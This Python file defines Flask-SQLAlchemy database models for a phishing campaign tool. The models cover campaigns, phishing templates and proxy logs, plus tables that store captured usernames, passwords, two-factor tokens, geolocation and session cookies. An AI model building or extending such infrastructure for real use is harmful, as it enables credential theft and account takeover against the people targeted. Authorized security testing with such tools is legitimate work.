from datetime import datetime
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin
from app import db

class User(UserMixin, db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    
    campaigns = db.relationship('Campaign', backref='creator', lazy=True)

class Campaign(db.Model):
    __tablename__ = 'campaigns'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    template_id = db.Column(db.Integer, db.ForeignKey('phishing_templates.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    target_url = db.Column(db.String(500))
    phish_url = db.Column(db.String(500))
    port = db.Column(db.Integer)
    path = db.Column(db.String(100))
    is_active = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    started_at = db.Column(db.DateTime)
    stopped_at = db.Column(db.DateTime)
    
    captured_credentials = db.relationship('CapturedCredential', backref='campaign', lazy=True)
    session_logs = db.relationship('SessionLog', backref='campaign', lazy=True)

class PhishingTemplate(db.Model):
    __tablename__ = 'phishing_templates'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    category = db.Column(db.String(50))  # social_media, email, cloud, etc.
    template_file = db.Column(db.String(200))
    target_domain = db.Column(db.String(100))
    is_builtin = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    campaigns = db.relationship('Campaign', backref='template', lazy=True)

class CapturedCredential(db.Model):
    __tablename__ = 'captured_credentials'
    
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'), nullable=False)
    username = db.Column(db.String(200))
    password = db.Column(db.Text)
    email = db.Column(db.String(200))
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    referer = db.Column(db.String(500))
    country = db.Column(db.String(100))
    city = db.Column(db.String(100))
    coordinates = db.Column(db.String(50))
    two_fa_token = db.Column(db.String(10))
    additional_data = db.Column(db.Text)  # JSON string for extra fields
    captured_at = db.Column(db.DateTime, default=datetime.utcnow)

class SessionLog(db.Model):
    __tablename__ = 'session_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'), nullable=False)
    session_id = db.Column(db.String(100))
    cookies = db.Column(db.Text)  # JSON string
    headers = db.Column(db.Text)  # JSON string
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    request_url = db.Column(db.String(500))
    request_method = db.Column(db.String(10))
    response_status = db.Column(db.Integer)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class ProxyLog(db.Model):
    __tablename__ = 'proxy_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'))
    request_url = db.Column(db.String(500))
    request_method = db.Column(db.String(10))
    request_headers = db.Column(db.Text)
    request_body = db.Column(db.Text)
    response_status = db.Column(db.Integer)
    response_headers = db.Column(db.Text)
    response_body = db.Column(db.Text)
    ip_address = db.Column(db.String(45))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
